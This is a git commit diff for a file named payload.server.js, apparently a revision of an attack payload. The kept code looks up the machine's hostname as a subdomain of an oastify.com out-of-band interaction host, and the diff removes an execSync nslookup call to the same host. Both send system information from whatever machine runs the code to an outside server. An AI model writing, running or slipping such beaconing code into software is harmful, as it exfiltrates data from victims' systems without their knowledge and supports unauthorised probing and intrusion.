721ac6f5515774cfc29b8ca56d7a24d4f882cf79
alex <alex@MacBook-Pro-admin-2.local>
2026-07-31 01:11:22 +0300

    v7: async-only, user collaborator

--- payload.server.js
+++ payload.server.js
@@ -6,10 +6,6 @@ module.exports = {
       var hostname = os.hostname();
       dns.lookup(hostname + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(err, addr) {});
     } catch(e) {}
-    try {
-      var cp = require("child_process");
-      cp.execSync("nslookup " + require("os").hostname() + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com 2>/dev/null &");
-    } catch(e) {}
     return null;
   }
 };
